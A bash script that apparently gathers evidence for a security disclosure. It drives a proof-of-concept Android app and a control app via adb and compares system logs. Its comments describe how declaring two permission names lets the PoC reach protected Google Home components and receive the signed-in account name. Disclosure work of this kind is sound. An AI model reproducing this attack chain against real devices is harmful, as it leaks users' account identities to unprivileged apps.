#!/usr/bin/env bash
# mvrp-evidence.sh — captures the evidence for G-F003 in one screen.
#
# Two apps built from one source tree, differing only in two <permission>
# rows, sent at the same two Google Home components. What the system did
# about each is printed from the system's own records.
#
# Output is English throughout: the screenshot goes to a triager.
#
# Why this is a script and not a pipeline typed by hand:
#   `dumpsys activity broadcasts` is several thousand lines. Trimming it
#   once with `head -6` meant two stale control records ate the six lines
#   and the PoC's DELIVERED line never showed — it looked like there was no
#   evidence when there was.
#
#   So the trimming is by time, not by count: for each caller the record
#   with the newest enqueueClockTime is the one printed. The print order of
#   the history is never assumed — it lists newest first, so taking "the
#   last block" would have returned the oldest record instead.
#
#   And if the newest record for either caller predates this run, the script
#   stops and says so. A half comparison is worse than none.
#
# Usage:  ./mvrp-evidence.sh
set -uo pipefail

PROBE="com.cindrasec.mvrpprobe"
CTL="com.cindrasec.mvrpctl"
ACT="com.cindrasec.mvrpprobe.MainActivity"   # control renames the package, not the class
ACTION="com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED"
TMP="${TMPDIR:-/tmp}"
RAW="$TMP/mvrp-evidence-$$.txt"
ALOG="$TMP/mvrp-evidence-act-$$.txt"
trap 'rm -f "$RAW" "$ALOG"' EXIT

command -v adb >/dev/null || { echo "!! adb not found"; exit 1; }
adb get-state >/dev/null 2>&1 || { echo "!! no device connected"; exit 1; }

# ---- control 1: both apps are actually installed ----
for p in "$PROBE" "$CTL"; do
  if ! adb shell pm path "$p" </dev/null 2>/dev/null | tr -d '\r' | grep -qF 'package:'; then
    echo "!! BROKEN: $p is not installed, there is nothing to compare"; exit 2
  fi
done

perms() {   # perms <pkg> : the granted names in the install permissions block
  adb shell dumpsys package "$1" </dev/null 2>/dev/null | tr -d '\r' \
    | awk '/install permissions:/{f=1;next} f&&/granted=/{sub(/^[[:space:]]*/,"");print;next} f&&/:$/{exit}'
}

echo "== what each app was granted at install =="
echo "-- PoC ($PROBE) --"
perms "$PROBE" | sed 's/^/   /'
echo "-- control ($CTL) --"
if [ "$(perms "$CTL" | grep -c . )" -eq 0 ]; then
  echo "   (none)"
else
  perms "$CTL" | sed 's/^/   /'
fi
echo

# Start of this run, on the device's clock, in the format dumpsys prints.
# The format cannot contain a space: `adb shell` has its argument re-parsed
# by the device shell, so "%d %H" would arrive as two arguments and date
# would fail. Joined with an underscore and split back here.
START=$(adb shell date +%Y-%m-%d_%H:%M:%S </dev/null 2>/dev/null | tr -d '\r' | tr '_' ' ')
[ -n "$START" ] || { echo "!! BROKEN: could not read the device clock"; exit 2; }
echo "run started (device clock): $START"
echo

fire() {   # fire <pkg> [action]
  adb shell am start -n "$1/$ACT" --es action "${2:-broadcast}" </dev/null >/dev/null 2>&1
  sleep 3
  adb shell am force-stop "$1" </dev/null >/dev/null 2>&1
}

echo "[1/2] control sending"
fire "$CTL"
echo "[2/2] PoC sending"
fire "$PROBE"
sleep 2

adb shell dumpsys activity broadcasts </dev/null 2>/dev/null | tr -d '\r' > "$RAW"

# ---- control 2: the dump was readable at all ----
LINES=$(grep -c . "$RAW")
if [ "$LINES" -lt 200 ]; then
  echo "!! BROKEN: only $LINES lines came back from dumpsys, it is not readable"; exit 2
fi

# The newest BLE_SCANNED record block for one caller. First line is
# `ET<tab><enqueueClockTime>`, then the block itself.
best_block() {   # best_block <pkg>
  awk -v act="$ACTION" -v who="$1" '
    function flush() {
      if (has && c == who && et != "" && (bt == "" || et > bt)) {
        bt = et; bn = n
        for (i = 1; i <= n; i++) bb[i] = buf[i]
      }
      n = 0; has = 0; c = ""; et = ""
    }
    /BroadcastRecord\{/ { flush() }
    { buf[++n] = $0 }
    index($0, act) { has = 1 }
    /caller=/ { x = $0; sub(/.*caller=/, "", x); sub(/[\/ ].*/, "", x); c = x }
    /enqueueClockTime=/ {
      x = $0; sub(/.*enqueueClockTime=/, "", x)
      # yyyy-MM-dd HH:mm:ss.SSS — two tokens, keep both
      split(x, f, " "); et = f[1] " " f[2]
    }
    END {
      flush()
      if (bt == "") exit 0
      printf "ET\t%s\n", bt
      for (i = 1; i <= bn; i++) print bb[i]
    }
  ' "$RAW"
}

show() {   # show <pkg> <label>
  local blk et
  blk=$(best_block "$1")
  if [ -z "$blk" ]; then
    echo "!! BROKEN: no BLE_SCANNED record from $1"
    return 1
  fi
  et=$(printf '%s\n' "$blk" | awk -F'\t' '/^ET\t/{print $2; exit}')
  # ---- control 3: this record belongs to this run, not to older history ----
  if [ "$et" \< "$START" ]; then
    echo "!! BROKEN: newest record from $1 is $et, before this run started ($START)."
    echo "!!         Its send produced no record in this run."
    return 1
  fi
  echo "---- $2 ----"
  printf '%s\n' "$blk" | grep -vE '^ET\b' | grep -E \
    'BroadcastRecord\{|caller=|enqueueClockTime=|DELIVERED|SKIPPED|^ *reason:|requires ' \
    | sed 's/^[[:space:]]*/   /'
  echo
}

echo "== first component: LockProximityReceiver, from ActivityManager's own history =="
echo
ok=0
show "$CTL"   "CONTROL  $CTL  (declares no permissions)" || ok=1
show "$PROBE" "POC      $PROBE  (declares the two names, nothing else)" || ok=1

if [ "$ok" -ne 0 ]; then
  echo "!! One branch is missing. Do not screenshot this output."
  exit 2
fi

cat <<'NOTE'
== how to read it ==
Same action, same code, same signing key. The only difference is two
<permission> rows in one manifest. The control is SKIPPED with a Permission
Denial giving the reason; the PoC is DELIVERED. Nothing else differs between
the two APKs, so nothing else can account for it.
NOTE

# ======================================================================
# Second component: FirstDockActivity.
#
# Here the refusal is not silent the way a broadcast's is, so it shows from
# two sides: the framework's ActivityTaskManager line, and whatever the
# calling app itself reports. Both are in logcat, so clear it first.
# ======================================================================
echo
echo "== second component: FirstDockActivity, from logcat =="
adb logcat -c </dev/null >/dev/null 2>&1

echo "[1/2] control trying"
fire "$CTL" activity
echo "[2/2] PoC trying"
fire "$PROBE" activity
sleep 2

adb logcat -d MVRP:I ActivityTaskManager:W '*:S' </dev/null 2>/dev/null \
  | tr -d '\r' > "$ALOG"

# ---- control 4: both apps really did try ----
# Each app prints its own package on the STARTACT line, so the two attempts
# can be told apart without relying on the order they appear in.
for p in "$CTL" "$PROBE"; do
  if [ "$(grep -c "STARTACT from $p" "$ALOG")" -eq 0 ]; then
    echo "!! BROKEN: no STARTACT line from $p — it did not run, or logcat missed it."
    exit 2
  fi
done

grep -E 'STARTACT|startActivity\(\)|SECURITY|Permission Denial' "$ALOG" | sed 's/^/   /'

cat <<'NOTE'

== how to read it ==
After the control's STARTACT line comes ActivityTaskManager's Permission
Denial; after the PoC's comes "startActivity() returned, no exception".

Note that the control app prints nothing of its own after STARTACT — not
even a caught SecurityException. The refusal is recorded by the framework
without reaching the caller. I did not chase down why: the comparison rests
on the framework's line, not on what either app chooses to log.
NOTE

# ======================================================================
# What reaching that activity is worth.
#
# FirstDockActivity.C() takes an IntentSender out of the intent that
# started it, merges an "accountName" extra holding the signed-in account
# into a com.android.wizard.NEXT intent, and fires it. So each build hands
# over an IntentSender of its own and we see what comes back.
#
# Both deliveries land in SinkReceiver, which is not exported, so each one
# can only have come through that app's own PendingIntent.
# ======================================================================
echo
echo "== what the caller receives back =="
adb logcat -c </dev/null >/dev/null 2>&1

echo "[1/2] control handing over its IntentSender"
fire "$CTL" dock
echo "[2/2] PoC handing over its IntentSender"
fire "$PROBE" dock
sleep 2

adb logcat -d MVRP:I ActivityTaskManager:W '*:S' </dev/null 2>/dev/null \
  | tr -d '\r' > "$ALOG"

dock_ok=0
# ---- control 5: both builds really tried ----
for p in "$CTL" "$PROBE"; do
  if [ "$(grep -c "DOCK from $p" "$ALOG")" -eq 0 ]; then
    echo "!! BROKEN: no DOCK line from $p — it did not run, or logcat missed it."
    dock_ok=1
  fi
done
# ---- control 6: the PoC got a delivery and the control did not ----
if [ "$(grep -c "SINK in $PROBE" "$ALOG")" -eq 0 ]; then
  echo "!! BROKEN: the PoC received nothing. Nothing to claim here."
  dock_ok=1
fi
if [ "$(grep -c "SINK in $CTL" "$ALOG")" -ne 0 ]; then
  echo "!! BROKEN: the control received a delivery too, so the permission is"
  echo "!!         not what decides this. Do not report it as if it were."
  dock_ok=1
fi
if [ "$dock_ok" -ne 0 ]; then
  echo "!! Do not screenshot this section."
  exit 2
fi

# The extras' key pattern allows dots: without them the filter silently
# dropped com.android.setupwizard.ResultCode, and a filter that quietly
# loses lines is the thing to avoid here above all.
grep -E 'DOCK from|SINK in|SINK [0-9]+ extras|Permission Denial|[A-Za-z_][A-Za-z0-9_.]* = ' "$ALOG" \
  | sed 's/^/   /'

cat <<'NOTE'

== how to read it ==
The control is refused at startActivity and its SinkReceiver gets nothing.
The PoC's SinkReceiver gets a com.android.wizard.NEXT delivery holding
accountName, the account signed into the Home app. The value is masked by
the PoC on purpose: showing that the key arrives with a real value attached
does not require printing the address.

That is the actual gain: not that a component is reachable, but that an app
holding no real permission is handed the user's account by a first-party app.
NOTE
